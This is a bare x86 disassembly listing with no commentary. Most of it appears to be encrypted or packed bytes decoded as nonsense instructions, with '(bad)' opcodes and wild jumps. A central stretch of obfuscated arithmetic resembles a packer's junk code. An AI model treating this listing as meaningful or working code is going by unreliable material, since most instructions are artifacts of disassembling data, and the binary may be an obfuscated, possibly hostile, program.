  41755b:	sub    BYTE PTR [edi],ah
  41755d:	and    eax,0x7f897026
  417562:	cmp    eax,0x182f9fc8
  417567:	mov    cl,0x9d
  417569:	mov    esi,0x1dc341b3
  41756e:	call   0x7d40:0x50574399
  417575:	lock cmp esp,0x19
  417579:	fs jmp 0x4175cb
  41757c:	inc    ebp
  41757d:	pop    esp
  41757e:	cmp    ah,0xfc
  417581:	pushf  
  417582:	add    DWORD PTR [edx],0xffffffc0
  417585:	xor    al,0x3a
  417587:	(bad)  
  417588:	(bad)  
  417589:	fisttp DWORD PTR [edi+0x67f28d05]
  41758f:	std    
  417590:	sub    al,0xc5
  417592:	sub    BYTE PTR ds:0x90586750,bh
  417598:	jnp    0x417548
  41759a:	and    al,0xc9
  41759c:	scas   eax,DWORD PTR es:[edi]
  41759d:	dec    edx
  41759e:	daa    
  41759f:	cmp    eax,0x5e3704e5
  4175a4:	out    0x5f,al
  4175a6:	xchg   ecx,eax
  4175a7:	bnd jge 0x41761a
  4175aa:	ret    0x6f40
  4175ad:	fwait
  4175ae:	mov    edx,0x940d6f36
  4175b3:	gs pop esi
  4175b5:	push   edx
  4175b6:	sbb    edi,DWORD PTR [esi-0x5e]
  4175b9:	lds    esi,FWORD PTR [ecx-0xfab6030]
  4175bf:	aaa    
  4175c0:	setbe  ah
  4175c3:	shl    BYTE PTR [ebx+ebp*8-0x3d],0x15
  4175c8:	push   esp
  4175c9:	mov    ah,0xfe
  4175cb:	jmp    0x9564:0x92c8fb46
  4175d2:	cmp    BYTE PTR [edx-0xa],0xfe
  4175d6:	je     0x4175a7
  4175d8:	sbb    ebp,DWORD PTR [esi+edx*2]
  4175db:	aam    0x55
  4175dd:	scas   al,BYTE PTR es:[edi]
  4175de:	push   esp
  4175df:	jge    0x4175c8
  4175e1:	sub    BYTE PTR [edi-0x35],al
  4175e4:	loope  0x4175cb
  4175e6:	adc    BYTE PTR [ecx-0x11],al
  4175e9:	xor    al,0xa0
  4175eb:	outs   dx,BYTE PTR ds:[esi]
  4175ec:	mov    bh,0x58
  4175ee:	dec    ecx
  4175ef:	xor    dh,BYTE PTR ds:0x2ef1f82e
  4175f5:	nop
  4175f6:	xor    BYTE PTR [edi],bh
  4175f8:	test   eax,0x863ed8c0
  4175fd:	add    dl,dh
  4175ff:	cmc    
  417600:	arpl   WORD PTR [ebx+0x34],cx
  417603:	sub    dl,dh
  417605:	push   esp
  417606:	and    ecx,esi
  417608:	fnstcw WORD PTR [ebx-0x16]
  41760b:	nop
  41760c:	bnd ret 
  41760e:	enter  0x2e5c,0xdd
  417612:	pop    eax
  417613:	jmp    0x716998c6
  417618:	fmulp  st(2),st
  41761a:	xlat   BYTE PTR ds:[ebx]
  41761b:	sbb    BYTE PTR [eax+0x63],0x12
  41761f:	aaa    
  417620:	sub    edi,ebp
  417622:	sbb    BYTE PTR [eax+0x21d6b893],ch
  417628:	sub    DWORD PTR [edi+0x36],ebp
  41762b:	aam    0xf2
  41762d:	jle    0x417615
  41762f:	loope  0x4175e9
  417631:	inc    ebx
  417632:	out    0x26,al
  417634:	mov    ds:0xb40798d6,eax
  417639:	jnp    0x417624
  41763b:	out    0x1b,eax
  41763d:	cmp    ah,bl
  41763f:	push   es
  417640:	lods   eax,DWORD PTR ds:[esi]
  417641:	sbb    BYTE PTR [edi+0x14],bl
  417644:	ficomp WORD PTR [esi]
  417646:	std    
  417647:	js     0x4175d3
  417649:	sar    ebx,cl
  41764b:	xchg   edi,eax
  41764c:	xchg   DWORD PTR [edx],edi
  41764e:	ficom  DWORD PTR [esi]
  417650:	pop    ebp
  417651:	jbe    0x417607
  417653:	out    dx,al
  417654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417655:	mov    bh,0x71
  417657:	cmp    al,0x94
  417659:	add    BYTE PTR [ebp-0x78423b10],bl
  41765f:	mov    ebp,0xcb24bcb
  417664:	adc    bl,cl
  417666:	das    
  417667:	dec    edx
  417668:	in     al,dx
  417669:	out    dx,al
  41766a:	cmp    cl,bl
  41766c:	sbb    DWORD PTR [edi+esi*2],ecx
  41766f:	inc    ebp
  417670:	arpl   dx,ax
  417672:	adc    ebx,esp
  417674:	xor    dl,cl
  417676:	js     0x4176e2
  417678:	mov    edi,0x6d86997d
  41767d:	fcom   QWORD PTR [ebx-0x14b06d9]
  417683:	cmp    ch,BYTE PTR [edx+0x74]
  417686:	pop    ecx
  417687:	adc    al,0x47
  417689:	cdq    
  41768a:	xor    BYTE PTR [edi],0x8f
  41768d:	push   es
  41768e:	xchg   esi,eax
  41768f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417690:	adc    ebp,ebp
  417692:	adc    ch,BYTE PTR [esi-0x35]
  417695:	xchg   ebp,eax
  417696:	stos   BYTE PTR es:[edi],al
  417697:	arpl   WORD PTR [edi-0x488856fb],si
  41769d:	or     eax,0x9406ba53
  4176a2:	xor    eax,0x142b5b13
  4176a7:	sbb    BYTE PTR [eax-0x6704af67],ch
  4176ad:	push   0xa9a45a0e
  4176b2:	xchg   edx,eax
  4176b3:	mov    ebx,eax
  4176b5:	sbb    al,0xa
  4176b7:	xor    BYTE PTR [esi],cl
  4176b9:	imul   ebp,esp,0xffffff89
  4176bc:	mov    dh,0xb9
  4176be:	call   0x176017e7
  4176c3:	iret   
  4176c4:	push   0xffffffdc
  4176c6:	inc    ecx
  4176c7:	scas   al,BYTE PTR es:[edi]
  4176c8:	sub    BYTE PTR [ebp+eiz*2+0x575dfe01],bl
  4176cf:	adc    bh,BYTE PTR [ecx+esi*2]
  4176d2:	test   al,0x65
  4176d4:	in     al,0xd6
  4176d6:	int    0x3d
  4176d8:	lock imul edi,ebp,0x4f
  4176dc:	pop    ebp
  4176dd:	xor    dh,BYTE PTR [edi]
  4176df:	lods   al,BYTE PTR ds:[esi]
  4176e0:	addr16 ret 
  4176e2:	(bad)  
  4176e4:	mov    dl,0xd5
  4176e6:	xchg   DWORD PTR [ebx-0x61553b64],eax
  4176ec:	mov    edx,0x583f86c3
  4176f1:	mov    ebp,0xfaa92893
  4176f6:	pop    edi
  4176f7:	mov    bl,0x80
  4176f9:	data16 sbb BYTE PTR [edi],0x37
  4176fd:	xor    eax,0x5e21685a
  417702:	addr16 dec ecx
  417704:	push   ebp
  417705:	jg     0x417784
  417707:	mov    ch,0x29
  417709:	cmp    eax,0xcc57d268
  41770e:	into   
  41770f:	call   0x96b69ba5
  417714:	das    
  417715:	xchg   ebp,eax
  417716:	(bad)  
  417717:	push   0x8d65def9
  41771c:	push   0xf806fea8
  417721:	inc    edx
  417722:	ret    
  417723:	cld    
  417724:	jne    0x417739
  417726:	cmp    eax,0x256299dd
  41772b:	mov    dl,0xa5
  41772d:	test   esp,ecx
  41772f:	jge    0x41777b
  417731:	cmp    bh,BYTE PTR [edi-0x4ee31175]
  417737:	inc    edx
  417738:	iret   
  417739:	fst    QWORD PTR [ebx+edx*1+0x29]
  41773d:	jno    0x4176ef
  41773f:	lea    edi,[eax]
  417741:	dec    esp
  417742:	xor    BYTE PTR [edi-0x14],dh
  417745:	and    al,0xf
  417747:	adc    al,BYTE PTR [eax+edi*4+0x52a26dbc]
  41774e:	or     al,0x2d
  417750:	loopne 0x4177cd
  417752:	in     eax,0x2b
  417754:	mov    esi,0xabd8e7fa
  417759:	stos   BYTE PTR es:[edi],al
  41775a:	add    ebp,eax
  41775c:	mov    eax,0x86fa2feb
  417761:	sub    BYTE PTR [ebp+0x7b42e9e],cl
  417767:	mov    eax,0x612f8afc
  41776c:	in     eax,dx
  41776d:	das    
  41776e:	sti    
  41776f:	push   ss
  417770:	and    al,BYTE PTR [esi+0x58]
  417773:	ja     0x4177ae
  417775:	jb     0x4176fc
  417777:	pop    eax
  417778:	sbb    al,0xd2
  41777a:	icebp  
  41777b:	ja     0x4177c9
  41777d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41777e:	or     BYTE PTR [ecx],ah
  417780:	xor    eax,0x85f2b192
  417785:	or     eax,eax
  417787:	xor    eax,0x1e21d073
  41778c:	or     DWORD PTR [ecx+0x598f28b1],edx
  417792:	dec    esi
  417793:	xchg   BYTE PTR [ecx-0x8],cl
  417796:	(bad)  
  417797:	xchg   esi,eax
  417798:	aas    
  417799:	lods   eax,DWORD PTR ds:[esi]
  41779a:	lahf   
  41779b:	xchg   ebx,eax
  41779c:	jmp    0x54bc1d5
  4177a1:	push   ebp
  4177a2:	adc    al,0x59
  4177a4:	cs pop es
  4177a6:	nop
  4177a7:	test   BYTE PTR [esi+0x6c4a763a],bl
  4177ad:	call   0xe475:0x3c2f0389
  4177b4:	fsubr  DWORD PTR ds:0x9bd38056
  4177ba:	add    ecx,ebp
  4177bc:	nop    ecx
  4177bf:	xor    BYTE PTR [edi+0x9d3ec9],dl
  4177c5:	adc    al,ah
  4177c7:	es push 0x6f
  4177ca:	add    al,0x9d
  4177cc:	dec    ecx
  4177cd:	jge    0x4177a7
  4177cf:	fbstp  TBYTE PTR [eax+0x480ca72f]
  4177d5:	sbb    ah,cl
  4177d7:	adc    DWORD PTR [edi-0x577ddbec],0xe7cc3fcd
  4177e1:	addr16 pop ecx
  4177e3:	dec    BYTE PTR [ebp+0x37]
  4177e6:	(bad)  
  4177e7:	ret    0x40a
  4177ea:	lods   eax,DWORD PTR ds:[esi]
  4177eb:	dec    esi
  4177ec:	repz push cs
  4177ee:	inc    ebp
  4177ef:	enter  0x619b,0x69
  4177f3:	lahf   
  4177f4:	inc    esi
  4177f5:	arpl   WORD PTR [eax-0x31],ax
  4177f8:	cwde   
  4177f9:	jl     0x417852
  4177fb:	ret    0x4e85
  4177fe:	mov    BYTE PTR [esi+0x14a9de64],dl
  417804:	xor    al,0x88
  417806:	cmp    DWORD PTR [eax],esp
  417808:	es pop edi
  41780a:	in     eax,dx
  41780b:	bound  esp,QWORD PTR [edi]
  41780d:	aad    0x1f
  41780f:	je     0x4177d8
  417811:	call   0xc0941e56
  417816:	mov    ds:0xf89b217,al
  41781b:	add    esp,DWORD PTR [ecx+0x66]
  41781e:	dec    ecx
  41781f:	imul   eax,DWORD PTR [edi],0x2e154847
  417825:	cmp    cl,al
  417827:	xlat   BYTE PTR ds:[ebx]
  417828:	pop    eax
  417829:	(bad)  
  41782a:	add    cl,al
  41782c:	sar    BYTE PTR [ebx-0x30f14e6c],0x7e
  417833:	mov    dl,0x42
  417835:	out    dx,eax
  417836:	pusha  
  417837:	scas   al,BYTE PTR es:[edi]
  417838:	lock mov ecx,0x7107e804
  41783e:	int3   
  41783f:	mov    DWORD PTR [ecx],esi
  417841:	addr16 inc ebx
  417843:	ret    0x99aa
  417846:	jl     0x4178b0
  417848:	push   0x308b0acd
  41784d:	mov    ecx,0xc16258b6
  417852:	push   ds
  417853:	je     0x417808
  417855:	dec    ebx
  417856:	nop
  417857:	dec    BYTE PTR [ebx]
  417859:	cmp    eax,0xc618563e
  41785e:	cwde   
  41785f:	sbb    ah,ah
  417861:	push   ds
  417862:	fdiv   DWORD PTR [ebp+0x365d91a8]
  417868:	xchg   edi,eax
  417869:	push   edx
  41786a:	sub    eax,0xa1222972
  41786f:	sub    esp,DWORD PTR [ebx+0xa4632cd]
  417875:	jnp    0x417882
  417877:	out    0x12,eax
  417879:	out    dx,al
  41787a:	xor    eax,0x94033c75
  41787f:	adc    DWORD PTR [ecx-0x37d0809b],esi
  417885:	xchg   ecx,eax
  417886:	sbb    edi,DWORD PTR [esi+0x53]
  417889:	stos   BYTE PTR es:[edi],al
  41788a:	push   esi
  41788b:	scas   eax,DWORD PTR es:[edi]
  41788c:	std    
  41788d:	mov    ebx,0xc3cad08a
  417892:	out    dx,al
  417893:	jo     0x4178ab
  417895:	ins    DWORD PTR es:[edi],dx
  417896:	jge    0x417859
  417898:	add    DWORD PTR [edi+ebx*2-0x6f8027d6],ebp
  41789f:	jl     0x417861
  4178a1:	jle    0x417914
  4178a3:	in     eax,dx
  4178a4:	sbb    al,BYTE PTR [ecx+0x2054104f]
  4178aa:	(bad)  
  4178ab:	mov    esp,0xc5679871
  4178b0:	vpsllw xmm5,xmm5,xmm3
  4178b4:	(bad)  
  4178b5:	push   ebx
  4178b6:	dec    esi
  4178b7:	sbb    al,0xbf
  4178b9:	and    edi,DWORD PTR [esi-0x39]
  4178bc:	jmp    0x417935
  4178be:	shl    BYTE PTR [ecx-0x3d4ea458],1
  4178c4:	jmp    0x41790d
  4178c6:	mov    dl,0xa0
  4178c8:	sahf   
  4178c9:	cli    
  4178ca:	pop    eax
  4178cb:	sub    DWORD PTR [edx-0x8],0x8513b6f9
  4178d2:	xchg   ebp,ebx
  4178d4:	imul   edi,ebp,0x33
  4178d7:	lods   eax,DWORD PTR ds:[esi]
  4178d8:	and    bl,BYTE PTR [edi]
  4178da:	icebp  
  4178db:	cmp    cl,0x3b
  4178de:	pop    ecx
  4178df:	push   ss
  4178e0:	push   ds
  4178e1:	jecxz  0x417908
  4178e3:	push   eax
  4178e4:	mov    ebp,ebx
  4178e6:	lahf   
  4178e7:	cmp    bl,bl
  4178e9:	ss mov edi,0x6ad40c3c
  4178ef:	add    BYTE PTR [ecx+0x4282f725],al
  4178f5:	add    BYTE PTR [esi-0xffff91],dh
  4178fb:	xor    DWORD PTR [ecx+0x4282970d],eax
  417901:	add    BYTE PTR [edi],ch
  417903:	add    BYTE PTR gs:[eax],al
  417906:	call   eax
  417908:	adc    esi,DWORD PTR ds:0x4282af
  41790e:	mov    esi,0x1ff
  417913:	add    eax,eax
  417915:	mov    DWORD PTR [esp+0x24],0x3992
  41791d:	mov    DWORD PTR [esp+0xc],0x79a2
  417925:	add    DWORD PTR ds:0x428297,0x3f4a
  41792f:	mov    eax,DWORD PTR [esp+0xc]
  417933:	mov    ecx,DWORD PTR ds:0x428337
  417939:	mov    ecx,DWORD PTR [ecx]
  41793b:	and    DWORD PTR ds:0x4282ff,ecx
  417941:	mov    ecx,DWORD PTR [esp+0x24]
  417945:	sub    DWORD PTR ds:0x4282af,0x4282b7
  41794f:	xor    eax,0x1d22
  417954:	xor    DWORD PTR ds:0x428373,0x3de5
  41795e:	imul   eax,eax,0xffffdeb4
  417964:	and    eax,0x43eb
  417969:	sub    eax,ecx
  41796b:	xor    DWORD PTR ds:0x4282cf,0x4281fb
  417975:	mov    DWORD PTR [esp+0x3c],eax
  417979:	xor    DWORD PTR ds:0x4281bb,0x24fe
  417983:	mov    DWORD PTR [esp+0x38],0x3b18
  41798b:	mov    DWORD PTR [esp+0x2c],0x6c93
  417993:	adc    DWORD PTR ds:0x4282bf,0x3367
  41799d:	mov    DWORD PTR [esp+0x24],0x418e
  4179a5:	add    DWORD PTR ds:0x4282fb,ebx
  4179ab:	mov    DWORD PTR [esp+0xc],0x5ac3
  4179b3:	xor    ecx,ecx
  4179b5:	add    ecx,DWORD PTR ds:0x428407
  4179bb:	add    DWORD PTR ds:0x4281cb,ecx
  4179c1:	mov    eax,DWORD PTR [esp+0xc]
  4179c5:	mov    ecx,DWORD PTR [esp+0x24]
  4179c9:	add    DWORD PTR ds:0x4282f3,0x705
  4179d3:	sub    ecx,eax
  4179d5:	and    eax,0x1ffb
  4179da:	mov    eax,DWORD PTR [esp+0x2c]
  4179de:	and    ecx,eax
  4179e0:	mov    eax,DWORD PTR [esp+0x38]
  4179e4:	sbb    DWORD PTR ds:0x4281b3,0x4283cf
  4179ee:	xor    ecx,0x10d6
  4179f4:	sub    ecx,0x782c
  4179fa:	imul   ecx,eax
  4179fd:	mov    eax,0x7fd0
  417a02:	mov    eax,DWORD PTR [esp+0x3c]
  417a06:	cmp    eax,ecx
  417a08:	mov    DWORD PTR ds:0x4281cb,0x7353
  417a12:	jne    0x41890f
  417a18:	and    eax,eax
  417a1a:	mov    DWORD PTR [esp+0x10],0x1
  417a22:	mov    DWORD PTR [esp+0x30],0x2f16
  417a2a:	xor    ecx,DWORD PTR ds:0x4282b7
  417a30:	mov    DWORD PTR [esp+0x48],0x16f
  417a38:	mov    DWORD PTR [esp+0x50],0x30c5
  417a40:	add    DWORD PTR ds:0x428357,edx
  417a46:	push   DWORD PTR ds:0xe5bfd6f1
  417a4c:	cmp    DWORD PTR ds:0x4282d3,0x0
  417a53:	mov    DWORD PTR ds:0x42834f,edx
  417a59:	mov    ecx,0x328
  417a5e:	mov    ecx,0x6d04
  417a63:	jmp    0x417abd
  417a68:	mov    DWORD PTR ds:0x4282c7,0x44f5
  417a72:	cmp    DWORD PTR ds:0x4282d3,0x0
  417a79:	je     0x417a9d
  417a7f:	push   DWORD PTR [ebp-0x18]
  417a82:	push   DWORD PTR [ebp-0x18]
  417a85:	push   0x8f00
  417a8a:	push   DWORD PTR [ebp-0x10]
  417a8d:	call   DWORD PTR ds:0x428e44
  417a93:	not    ecx
  417a95:	sub    ecx,ecx
  417a97:	or     DWORD PTR ds:0x4282a7,ebx
  417a9d:	mov    ecx,DWORD PTR ds:0x428333
  417aa3:	mov    ecx,DWORD PTR [ecx]
  417aa5:	and    DWORD PTR ds:0x4281eb,ecx
  417aab:	sbb    ecx,0x5390
  417ab1:	add    ecx,0xb3f
  417ab7:	add    DWORD PTR ds:0x4281fb,edi
  417abd:	mov    DWORD PTR [esp+0x8c],0x4ebc
  417ac8:	xor    eax,eax
  417aca:	mov    DWORD PTR [esp+0x98],0x76
  417ad5:	mov    DWORD PTR [esp+0x40],0x556d
  417add:	neg    DWORD PTR ds:0x4281bf
  417ae3:	jmp    0x417eb2
  417ae8:	(bad)  [eax-0x2]
  417aec:	xor    BYTE PTR [edx+0x1a],bh
  417aef:	fwait
  417af0:	clc    
  417af1:	dec    edi
  417af2:	arpl   WORD PTR [edx+edi*2-0x518fa478],di
  417af9:	loope  0x417b11
  417afb:	sbb    BYTE PTR [edx+edx*1-0x6108e7e8],bh
  417b02:	daa    
  417b03:	cs mov edx,0xf4b39ce6
  417b09:	jnp    0x417b8a
  417b0b:	les    edi,FWORD PTR [esi+0x7b504771]
  417b11:	mov    bh,0xa2
  417b13:	pmulhw mm1,QWORD PTR ds:0x3467e6e2
  417b1a:	xor    al,0x96
  417b1c:	add    al,0xe0
  417b1e:	pop    ebp
  417b1f:	stos   DWORD PTR es:[edi],eax
  417b20:	sub    DWORD PTR [ecx-0x61eac5ce],ebx
  417b26:	or     ecx,DWORD PTR ds:[ecx-0x47b61591]
  417b2d:	iret   
  417b2e:	xchg   ah,dl
  417b30:	mov    eax,ds:0xd8de0d57
  417b35:	and    eax,0x5c180d44
  417b3a:	retf   
  417b3b:	xchg   ecx,eax
  417b3c:	je     0x417aea
  417b3e:	int    0x2d
  417b40:	xchg   dh,dl
  417b42:	stos   BYTE PTR es:[edi],al
  417b43:	dec    ebx
  417b44:	leave  
  417b45:	sub    bh,BYTE PTR [edx+0x3b]
  417b48:	xor    ebp,DWORD PTR [eax+0x2a]
  417b4b:	cmp    eax,DWORD PTR [ebx-0x19]
  417b4e:	test   al,0xd
  417b50:	popf   
  417b51:	dec    ebp
  417b52:	push   0xb6434de9
  417b57:	iret   
  417b58:	sbb    BYTE PTR [eax+0x54e2fbaa],ah
  417b5e:	mov    edi,0xaf6a4662
  417b63:	mov    cl,0x1d
  417b65:	sub    al,0xb
  417b67:	mov    ebx,0x85a9d122
  417b6c:	pop    ecx
  417b6d:	imul   esp,ebp,0x35c8ad56
  417b73:	fsubr  QWORD PTR [eax]
  417b75:	xchg   esi,eax
  417b76:	mov    ch,0x60
  417b78:	(bad)  
  417b79:	sub    al,0x7f
  417b7b:	mov    edi,0xd88c0beb
  417b80:	dec    esi
  417b81:	cmp    dl,bl
  417b83:	jle    0x417c04
  417b85:	xchg   di,ax
  417b87:	sub    BYTE PTR es:[ebx+0x84b9432],ah
  417b8e:	sub    cl,ch
  417b90:	lods   al,BYTE PTR ds:[esi]
  417b91:	jmp    DWORD PTR [esp+eax*2-0x21dda20e]
  417b98:	loopne 0x417b90
  417b9a:	out    0x64,al
  417b9c:	ins    BYTE PTR es:[edi],dx
  417b9d:	bound  ebp,QWORD PTR [edx]
  417b9f:	gs sti 
  417ba1:	mov    edx,0x6659eb67
  417ba6:	dec    ebp
  417ba7:	retf   
  417ba8:	bound  edi,QWORD PTR [edi-0x430bacac]
  417bae:	jne    0x417b97
  417bb0:	loop   0x417bc8
  417bb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bb3:	cld    
  417bb4:	adc    DWORD PTR [ebp+0x33],eax
  417bb7:	iretw  
  417bb9:	mov    DWORD PTR [edx],ecx
  417bbb:	pop    ebp
  417bbc:	add    eax,0x49a47751
  417bc1:	lods   eax,DWORD PTR ds:[esi]
  417bc2:	inc    ebx
  417bc3:	lock clc 
  417bc5:	dec    eax
  417bc6:	cmp    ecx,esp
  417bc8:	enter  0xdb63,0xaa
  417bcc:	mov    edx,0xd0306b51
  417bd1:	or     ebx,DWORD PTR [ebx-0x58]
  417bd4:	(bad)  
  417bd5:	je     0x417b8f
  417bd7:	ret    0xa5d
  417bda:	dec    eax
  417bdb:	enter  0x2543,0x64
  417bdf:	js     0x417b7e
  417be1:	cmp    eax,0x715c2019
  417be6:	push   edx
  417be7:	sti    
  417be8:	or     BYTE PTR [esi+0x7],bl
  417beb:	ins    DWORD PTR es:[edi],dx
  417bec:	idiv   BYTE PTR [ebx+ebx*8-0x2]
  417bf0:	cdq    
  417bf1:	mov    cl,0x7d
  417bf3:	push   ds
  417bf4:	cmp    BYTE PTR [ecx+0x12],0xd7
  417bf8:	shr    BYTE PTR [ebx],cl
  417bfa:	enter  0xd7c2,0xd3
  417bfe:	add    BYTE PTR [ecx],0x3e
  417c01:	or     al,0x79
  417c03:	test   DWORD PTR [eax+ebx*8+0x7e],edx
  417c07:	xchg   ecx,eax
  417c08:	mov    BYTE PTR [ecx],ah
  417c0a:	mov    BYTE PTR gs:[edx-0x39],cl
  417c0e:	xor    eax,0x41b0a054
  417c13:	test   DWORD PTR [edi+0x26],0x3a4c947c
  417c1a:	and    BYTE PTR [eax],ah
  417c1c:	cmp    ecx,eax
  417c1e:	push   esp
  417c1f:	loopne 0x417c15
  417c21:	jno    0x417bf2
  417c23:	xchg   DWORD PTR [ebx+0xf1ff15e],esp
  417c29:	pop    ds
  417c2a:	cmp    ecx,ebx
  417c2c:	stc    
  417c2d:	push   ds
  417c2e:	cmp    BYTE PTR [eax+0x20],dl
  417c31:	adc    al,0x2f
  417c33:	mov    ebp,0xc17e3503
  417c38:	popf   
  417c39:	lds    ebx,FWORD PTR [eax]
  417c3b:	adc    eax,edx
  417c3d:	inc    ebp
  417c3e:	les    edx,FWORD PTR fs:[ebp-0x447fe98a]
  417c45:	int    0x28
  417c47:	push   eax
  417c48:	mov    ebp,0x7a2bb3e3
  417c4d:	push   edi
  417c4e:	sub    eax,0x133d5ae6
  417c53:	push   0xffffff95
  417c55:	mov    edi,0x1b1ad50f
  417c5a:	aaa    
  417c5b:	pop    edx
  417c5c:	ins    DWORD PTR es:[edi],dx
  417c5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c5e:	pop    ebp
  417c5f:	jp     0x417bf2
  417c61:	in     eax,0xef
  417c63:	sub    eax,0x69c6d409
  417c68:	lods   al,BYTE PTR ds:[esi]
  417c69:	bound  esp,QWORD PTR [edx-0x2c986075]
  417c6f:	xor    edi,DWORD PTR ds:0x7b895eb5
  417c75:	fsubr  st,st(5)
  417c77:	fdivr  QWORD PTR [ecx]
  417c79:	ror    DWORD PTR [esp+ebx*2-0x2b],cl
  417c7d:	or     BYTE PTR [esi],ch
  417c7f:	mov    ecx,0xd57d6251
  417c84:	dec    ebp
  417c85:	push   ds
  417c86:	jnp    0x417caf
  417c88:	jecxz  0x417c14
  417c8a:	sbb    BYTE PTR [ebp+0x218fd4b],bh
  417c90:	repz and cl,BYTE PTR [ecx+0x5f]
  417c94:	or     bl,al
  417c96:	mov    eax,ds:0x65634ecf
  417c9b:	mov    dh,0x28
  417c9d:	push   edx
  417c9e:	mov    esi,gs
  417ca0:	icebp  
  417ca1:	pushf  
  417ca2:	mov    DWORD PTR [ebx],ecx
  417ca4:	dec    ebp
  417ca5:	sbb    DWORD PTR [eax],edx
  417ca7:	in     al,dx
  417ca8:	cli    
  417ca9:	mov    ecx,0xf74fa665
  417cae:	xchg   esi,eax
  417caf:	mov    cl,0xab
  417cb1:	xchg   ecx,eax
  417cb2:	jmp    0xf6f12e14
  417cb7:	test   DWORD PTR [edi+0x2e],edi
  417cba:	js     0x417cc5
  417cbc:	pop    ebx
  417cbd:	clc    
  417cbe:	ds repz shl edi,0x99
  417cc3:	(bad)  [esi+0x20]
  417cc6:	and    BYTE PTR [eax+0xf874fad],ah
  417ccc:	mov    edi,0xeb0a3108
  417cd1:	push   es
  417cd2:	add    ebx,DWORD PTR [ebp+0xee90870]
  417cd8:	arpl   WORD PTR [ebx-0x1c],si
  417cdb:	jno    0x417cf9
  417cdd:	(bad)  
  417cde:	fidivr WORD PTR [ecx+0x5b]
  417ce1:	or     bl,BYTE PTR [ecx]
  417ce3:	dec    ebx
  417ce4:	pushfw 
  417ce6:	xor    DWORD PTR [edi-0x21],esi
  417ce9:	cs scas al,BYTE PTR es:[edi]
  417ceb:	sub    eax,DWORD PTR [edx+ebp*4+0x7c]
  417cef:	jmp    0x417caf
  417cf1:	shl    DWORD PTR [esi+0x16ce2145],1
  417cf7:	add    eax,0x147fa006
  417cfc:	sahf   
  417cfd:	push   0x7897d0e1
  417d02:	mov    BYTE PTR [edx+0x4acd85c7],bh
  417d08:	xor    DWORD PTR [ecx-0x51],ebx
  417d0b:	mov    edx,0x9a1ef637
  417d10:	mov    WORD PTR [ecx-0x13d76cac],?
  417d16:	mov    al,ds:0xe1443b50
  417d1b:	push   ecx
  417d1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d1d:	xchg   DWORD PTR [edx+ebp*4+0x77e8bf23],edi
  417d24:	mov    dl,BYTE PTR [ecx+0x7575402]
  417d2a:	push   edi
  417d2b:	cwde   
  417d2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d2d:	outs   dx,BYTE PTR ds:[esi]
  417d2e:	xor    al,BYTE PTR [edx+0x4acc8540]
  417d34:	(bad)  
  417d35:	pop    ss
  417d36:	cmp    eax,0xa76decf2
  417d3b:	inc    ebp
  417d3c:	fnstenv [eax-0x79]
  417d3f:	es push ss
  417d41:	fsubr  DWORD PTR [ecx+0xe1ec4d]
  417d47:	inc    edi
  417d48:	int3   
  417d49:	fdiv   st,st(5)
  417d4b:	loope  0x417d5b
  417d4d:	stos   DWORD PTR es:[edi],eax
  417d4e:	pop    es
  417d4f:	dec    ebx
  417d50:	je     0x417da1
  417d52:	test   ebp,ebx
  417d54:	mov    BYTE PTR [edx+edx*1-0x2e],bh
  417d58:	fcmovnbe st,st(6)
  417d5a:	sub    bh,dl
  417d5c:	(bad)  
  417d5d:	int    0xc6
  417d5f:	jmp    0x417db2
  417d61:	pop    ss
  417d62:	and    eax,0x3c355d72
  417d67:	pop    esp
  417d68:	dec    eax
  417d69:	mov    ecx,0xbc89711f
  417d6e:	adc    BYTE PTR [esi+0x78],cl
  417d71:	inc    esi
  417d72:	mov    ?,WORD PTR [edx+0x28603839]
  417d78:	icebp  
  417d79:	mov    al,ds:0x7e79b897
  417d7e:	sbb    eax,0xa2e92c04
  417d83:	mov    WORD PTR [bp-0x39],ds
  417d87:	out    0x14,al
  417d89:	jo     0x417db4
  417d8b:	cmp    DWORD PTR [edi-0x40c2235a],edi
  417d91:	hlt    
  417d92:	mov    al,ds:0x272ec18b
  417d97:	jnp    0x417de6
  417d99:	xchg   ecx,eax
  417d9a:	out    dx,al
  417d9b:	inc    eax
  417d9c:	into   
  417d9d:	push   ds
  417d9e:	sbb    al,BYTE PTR [ecx-0x14de2f30]
  417da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417da5:	sbb    esp,DWORD PTR [edi+0x4634dd50]
  417dab:	fs mul cl
  417dae:	jmp    0xefa1:0xb074a6eb
  417db5:	mov    ecx,0x29968b1f
  417dba:	(bad)  
  417dbb:	cdq    
  417dbc:	int3   
  417dbd:	test   DWORD PTR [esi],esp
  417dbf:	pop    edi
  417dc0:	xchg   DWORD PTR [ebx],esi
  417dc2:	dec    edi
  417dc3:	sbb    DWORD PTR [edi-0x4],eax
  417dc6:	dec    ecx
  417dc7:	in     al,0x93
  417dc9:	mov    DWORD PTR [esi-0x2ca11be2],ebx
  417dcf:	retf   0x2099
  417dd2:	fidivr DWORD PTR [edi]
  417dd4:	fst    st(3)
  417dd6:	push   0xffffffa4
  417dd8:	sub    BYTE PTR [edi-0x42c1e328],al
  417dde:	cmp    bl,dl
  417de0:	or     DWORD PTR [ebx-0x23b38853],ebx
  417de6:	mov    cl,0xab
  417de8:	ins    BYTE PTR es:[edi],dx
  417de9:	jmp    DWORD PTR [ebp+0x4df975a5]
  417def:	and    ecx,0x55
  417df2:	xor    DWORD PTR [eax+0x3b],ecx
  417df5:	push   edx
  417df6:	outs   dx,BYTE PTR ds:[esi]
  417df7:	test   BYTE PTR [ebp-0x48],dh
  417dfa:	push   ecx
  417dfb:	cs xor eax,0xe96d22a6
  417e01:	push   eax
  417e02:	cmp    DWORD PTR [edx],esp
  417e04:	lods   al,BYTE PTR ds:[esi]
  417e05:	jmp    0xa56d1b80
  417e0a:	mov    eax,0xb2ea3cfc
  417e0f:	sub    al,0xa9
  417e11:	mov    ebp,0xb95aadf4
  417e16:	shl    WORD PTR [ebx+0x36],1
  417e1a:	fs push 0x42e2e9f0
  417e20:	sbb    DWORD PTR [ebx+0x3ed02c5d],esi
  417e26:	clc    
  417e27:	ret    
  417e28:	sub    al,0x62
  417e2a:	bound  esi,QWORD PTR [edx]
